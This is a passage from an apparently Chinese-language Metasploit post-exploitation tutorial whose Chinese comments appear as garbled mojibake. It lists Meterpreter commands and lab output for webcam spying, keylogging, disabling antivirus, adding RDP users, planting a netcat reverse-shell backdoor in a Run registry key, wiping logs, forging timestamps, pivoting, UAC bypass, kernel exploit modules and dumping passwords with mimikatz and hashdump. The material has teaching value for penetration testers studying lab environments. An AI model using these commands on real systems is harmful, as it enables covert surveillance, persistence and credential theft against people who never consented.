æŸ¥çœ‹æ‘„åƒå¤´æ¥å£</span><br><span class="line">webcam_snap   #é€šè¿‡æ‘„åƒå¤´æ‹ç…§</span><br><span class="line">webcam_stream   #é€šè¿‡æ‘„åƒå¤´å¼€å¯è§†é¢‘</span><br><span class="line"></span><br><span class="line"># uictlå¼€å…³é”®ç›˜/é¼ æ ‡</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #å¼€å¯æˆ–ç¦æ­¢é”®ç›˜/é¼ æ ‡</span><br><span class="line">uictl disable mouse  #ç¦ç”¨é¼ æ ‡</span><br><span class="line">uictl disable keyboard  #ç¦ç”¨é”®ç›˜</span><br><span class="line"></span><br><span class="line"># è¿œç¨‹æ¡Œé¢/æˆªå±</span><br><span class="line">enumdesktops  #æŸ¥çœ‹å¯ç”¨çš„æ¡Œé¢</span><br><span class="line">getdesktop    #è·å–å½“å‰meterpreter å…³è”çš„æ¡Œé¢</span><br><span class="line">screenshot  #æˆªå±</span><br><span class="line">use espia  #æˆ–è€…ä½¿ç”¨espiaæ¨¡å—æˆªå±  ç„¶åè¾“å…¥screengrab</span><br><span class="line">run vnc  #ä½¿ç”¨vncè¿œç¨‹æ¡Œé¢è¿æ¥</span><br><span class="line"></span><br><span class="line"># é”®ç›˜è®°å½•</span><br><span class="line">keyscan_start  #å¼€å§‹é”®ç›˜è®°å½•</span><br><span class="line">keyscan_dump   #å¯¼å‡ºè®°å½•æ•°æ®</span><br><span class="line">keyscan_stop #ç»“æŸé”®ç›˜è®°å½•</span><br><span class="line"></span><br><span class="line"># æ·»åŠ ç”¨æˆ·ï¼Œå¼€å¯è¿œç¨‹æ¡Œé¢</span><br><span class="line"># å¼€å¯rdpæ˜¯é€šè¿‡regä¿®æ”¹æ³¨å†Œè¡¨ï¼›æ·»åŠ ç”¨æˆ·æ˜¯è°ƒç”¨cmd.exe é€šè¿‡net useræ·»åŠ ï¼›ç«¯å£è½¬å‘æ˜¯åˆ©ç”¨çš„portfwdå‘½ä»¤</span><br><span class="line">run post/windows/manage/enable_rdp  #å¼€å¯è¿œç¨‹æ¡Œé¢</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #æ·»åŠ ç”¨æˆ·</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #å°†3389ç«¯å£è½¬å‘åˆ°6662</span><br><span class="line"></span><br><span class="line"># å…³é—­é˜²ç—…æ¯’è½¯ä»¶</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹æ³¨å†Œè¡¨</span><br><span class="line">reg â€“h # æ³¨å†Œè¡¨å‘½ä»¤å¸®åŠ©</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #ä¸Šä¼ nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #æšä¸¾runä¸‹çš„key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #è®¾ç½®é”®å€¼</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #æŸ¥çœ‹é”®å€¼</span><br><span class="line">nc -v 192.168.81.162 443  #æ”»å‡»è€…è¿æ¥ncåé—¨</span><br><span class="line"></span><br><span class="line"># æ¸…ç†æ—¥å¿—</span><br><span class="line">clearav  #æ¸…é™¤windowsä¸­çš„åº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—ã€å®‰å…¨æ—¥å¿—</span><br></pre></td></tr></table></figure><h3 id="4-2-æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤-2"><a href="#4-2-æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤-2" class="headerlink" title="4.2 æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤"></a>4.2 æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # åŸºæœ¬å‘½ä»¤</span><br><span class="line">search -f *pass* -d C:\\windows # æœç´¢æ–‡ä»¶  -hæŸ¥çœ‹å¸®åŠ©</span><br><span class="line">getwd/pwd  # è·å–å½“å‰ç›®å½•</span><br><span class="line">getlwd/lpwd   # æ“ä½œæ”»å‡»è€…ä¸»æœº æŸ¥çœ‹å½“å‰ç›®å½•</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # ä¸‹è½½æ–‡ä»¶</span><br><span class="line">edit c:\\1.txt  # ç¼–è¾‘æˆ–åˆ›å»ºæ–‡ä»¶  æ²¡æœ‰çš„è¯ï¼Œä¼šæ–°å»ºæ–‡ä»¶</span><br><span class="line">mkdir lltest2  # åªèƒ½åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹</span><br><span class="line">rmdir lltest2  # åªèƒ½åˆ é™¤å½“å‰ç›®å½•ä¸‹æ–‡ä»¶å¤¹</span><br><span class="line">lcd /tmp   # æ“ä½œæ”»å‡»è€…ä¸»æœº åˆ‡æ¢ç›®å½•</span><br><span class="line"></span><br><span class="line"># timestompä¼ªé€ æ–‡ä»¶æ—¶é—´æˆ³</span><br><span class="line">timestomp C:// -h   #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">timestomp -v C://2.txt   #æŸ¥çœ‹æ—¶é—´æˆ³</span><br><span class="line">timestomp C://2.txt -f C://1.txt #å°†1.txtçš„æ—¶é—´æˆ³å¤åˆ¶ç»™2.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-ç½‘ç»œå‘½ä»¤-2"><a href="#4-3-ç½‘ç»œå‘½ä»¤-2" class="headerlink" title="4.3 ç½‘ç»œå‘½ä»¤"></a>4.3 ç½‘ç»œå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># åŸºæœ¬</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat â€“ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #æŸ¥çœ‹ä»£ç†ä¿¡æ¯</span><br><span class="line">route   #æŸ¥çœ‹è·¯ç”±</span><br><span class="line"></span><br><span class="line"># portfwdç«¯å£è½¬å‘</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # å°†ç›®æ ‡æœºçš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°6666ç«¯å£</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #ç„¶åä½¿ç”¨rdesktopæ¥è¿æ¥ï¼Œ-u ç”¨æˆ·å -p å¯†ç </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># æ·»åŠ è·¯ç”±</span><br><span class="line"></span><br><span class="line"># æ–¹å¼ä¸€autoroute ï¼ˆdeprecatedï¼‰</span><br><span class="line">run autoroute â€“h #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run autoroute -s 192.168.2.0/24  #æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run autoroute â€“p  #æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line"># æ–¹å¼äºŒpost/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #è‡ªåŠ¨æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run post/multi/manage/autoroute CMD=print # æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># ç„¶åå¯ä»¥åˆ©ç”¨arp_scannerã€portscanç­‰è¿›è¡Œæ‰«æ</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autorouteæ·»åŠ å®Œè·¯ç”±åï¼Œè¿˜å¯ä»¥åˆ©ç”¨msfè‡ªå¸¦çš„æ¨¡å—è¿›è¡Œsocksä»£ç†</span><br><span class="line"># msfæä¾›äº†2ä¸ªæ¨¡å—ç”¨æ¥åšsocksä»£ç†ã€‚</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># å…ˆbackgroundé€€å‡ºæ¥ï¼Œç„¶åï¼š</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># ç„¶åvi /etc/proxychains.conf #æ·»åŠ  socks5 127.0.0.1 1080</span><br><span class="line"># æœ€åproxychains ä½¿ç”¨Socks5ä»£ç†è®¿é—®</span><br><span class="line"></span><br><span class="line"># snifferæŠ“åŒ…</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #æŸ¥çœ‹ç½‘å¡</span><br><span class="line">sniffer_start 2   #é€‰æ‹©ç½‘å¡ å¼€å§‹æŠ“åŒ…</span><br><span class="line">sniffer_stats 2   #æŸ¥çœ‹çŠ¶æ€</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #å¯¼å‡ºpcapæ•°æ®åŒ…</span><br><span class="line">sniffer_stop 2   #åœæ­¢æŠ“åŒ…</span><br></pre></td></tr></table></figure><h3 id="4-4-ä¿¡æ¯æ”¶é›†-2"><a href="#4-4-ä¿¡æ¯æ”¶é›†-2" class="headerlink" title="4.4 ä¿¡æ¯æ”¶é›†"></a>4.4 ä¿¡æ¯æ”¶é›†</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># ä¿¡æ¯æ”¶é›†çš„è„šæœ¬ä½äºï¼š</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># ä»¥ä¸‹åˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„</span><br><span class="line">run post/windows/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº</span><br><span class="line">run post/linux/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº</span><br><span class="line">run post/windows/gather/forensics/enum_drives #æŸ¥çœ‹åˆ†åŒº</span><br><span class="line">run post/windows/gather/enum_applications #è·å–å®‰è£…è½¯ä»¶ä¿¡æ¯</span><br><span class="line">run post/windows/gather/dumplinks   #è·å–æœ€è¿‘çš„æ–‡ä»¶æ“ä½œ</span><br><span class="line">run post/windows/gather/enum_ie  #è·å–IEç¼“å­˜</span><br><span class="line">run post/windows/gather/enum_chrome   #è·å–Chromeç¼“å­˜</span><br><span class="line">run post/windows/gather/enum_patches  #è¡¥ä¸ä¿¡æ¯</span><br><span class="line">run post/windows/gather/enum_domain  #æŸ¥æ‰¾åŸŸæ§</span><br></pre></td></tr></table></figure><h3 id="4-5-ææƒ-2"><a href="#4-5-ææƒ-2" class="headerlink" title="4.5 ææƒ"></a>4.5 ææƒ</h3>1.getsystemææƒ<br>getsystemå·¥ä½œåŸç†ï¼š<br>â‘ getsystemåˆ›å»ºä¸€ä¸ªæ–°çš„WindowsæœåŠ¡ï¼Œè®¾ç½®ä¸ºSYSTEMè¿è¡Œï¼Œå½“å®ƒå¯åŠ¨æ—¶è¿æ¥åˆ°ä¸€ä¸ªå‘½åç®¡é“ã€‚<br>â‘¡getsystemäº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªå‘½åç®¡é“å¹¶ç­‰å¾…æ¥è‡ªè¯¥æœåŠ¡çš„è¿æ¥ã€‚<br>â‘¢WindowsæœåŠ¡å·²å¯åŠ¨ï¼Œå¯¼è‡´ä¸å‘½åç®¡é“å»ºç«‹è¿æ¥ã€‚<br>â‘£è¯¥è¿›ç¨‹æ¥æ”¶è¿æ¥å¹¶è°ƒç”¨ImpersonateNamedPipeClientï¼Œä»è€Œä¸ºSYSTEMç”¨æˆ·åˆ›å»ºæ¨¡æ‹Ÿä»¤ç‰Œã€‚<br>ç„¶åç”¨æ–°æ”¶é›†çš„SYSTEMæ¨¡æ‹Ÿä»¤ç‰Œäº§ç”Ÿcmd.exeï¼Œå¹¶ä¸”æˆ‘ä»¬æœ‰ä¸€ä¸ªSYSTEMç‰¹æƒè¿›ç¨‹ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>2.bypassuac<br>ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUACï¼‰æ˜¯å¾®è½¯åœ¨ Windows Vista ä»¥åç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæœ‰åŠ©äºé˜²æ­¢å¯¹ç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„æ›´æ”¹ã€‚åº”ç”¨ç¨‹åºå’Œä»»åŠ¡å¯å§‹ç»ˆåœ¨éç®¡ç†å‘˜å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œé™¤éç®¡ç†å‘˜ä¸“é—¨ç»™ç³»ç»Ÿæˆäºˆç®¡ç†å‘˜çº§åˆ«çš„è®¿é—®æƒé™ã€‚UAC å¯ä»¥é˜»æ­¢æœªç»æˆæƒçš„åº”ç”¨ç¨‹åºè¿›è¡Œè‡ªåŠ¨å®‰è£…ï¼Œå¹¶é˜²æ­¢æ— æ„ä¸­æ›´æ”¹ç³»ç»Ÿè®¾ç½®ã€‚msfæä¾›äº†å¦‚ä¸‹å‡ ä¸ªæ¨¡å—å¸®åŠ©ç»•è¿‡UACï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>ä½¿ç”¨æ–¹æ³•ç±»ä¼¼ï¼Œè¿è¡Œåè¿”å›ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œ<strong>éœ€è¦å†æ¬¡æ‰§è¡Œgetsystemè·å–ç³»ç»Ÿæƒé™</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># ç„¶åè¿”å›æ–°çš„meterpreterä¼šè¯ï¼Œç»§ç»­æ‰§è¡Œgetsystemæœ¬åº”è¯¥ä¼šææƒæˆåŠŸ</span><br><span class="line"># ç„¶é¹…è¿™é‡Œå¤±è´¥äº†</span><br></pre></td></tr></table></figure>3.å†…æ ¸æ¼æ´ææƒæ— è®ºæ˜¯linuxè¿˜æ˜¯windowséƒ½å‡ºè¿‡å¾ˆå¤šé«˜å±çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬è¿›è¡Œæƒé™æå‡ï¼Œæ¯”å¦‚windowsç³»ç»Ÿçš„ms13-081ã€ms15-051ã€ms16-032ã€ms17-010ç­‰ï¼Œmsfä¹Ÿé›†æˆäº†è¿™äº›æ¼æ´çš„åˆ©ç”¨æ¨¡å—ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># ç„¶é¹…å¤±è´¥äº†ï¼Œæ‘¸æ‘¸å¤´</span><br></pre></td></tr></table></figure><h3 id="4-6-è·å–å‡­è¯-2"><a href="#4-6-è·å–å‡­è¯-2" class="headerlink" title="4.6 è·å–å‡­è¯"></a>4.6 è·å–å‡­è¯</h3>åœ¨å†…ç½‘ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªç®¡ç†å‘˜å¯èƒ½ç®¡ç†å¤šå°æœåŠ¡å™¨ï¼Œä»–ä½¿ç”¨çš„å¯†ç æœ‰å¯èƒ½ç›¸åŒæˆ–è€…æœ‰è§„å¾‹ï¼Œå¦‚æœèƒ½å¤Ÿå¾—åˆ°å¯†ç æˆ–è€…hashï¼Œå†å°è¯•ç™»å½•å†…ç½‘å…¶å®ƒæœåŠ¡å™¨ï¼Œå¯èƒ½å–å¾—æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚1.ä½¿ç”¨mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">wdigest  #è·å–Wdigestå¯†ç </span><br><span class="line">mimikatz_command -f samdump::hashes  #æ‰§è¡ŒmimikatzåŸå§‹å‘½ä»¤</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) ï¿½İ¿ï¿½ </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure><ol><li>ä½¿ç”¨meterpreterçš„run hashdumpå‘½ä»¤</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant 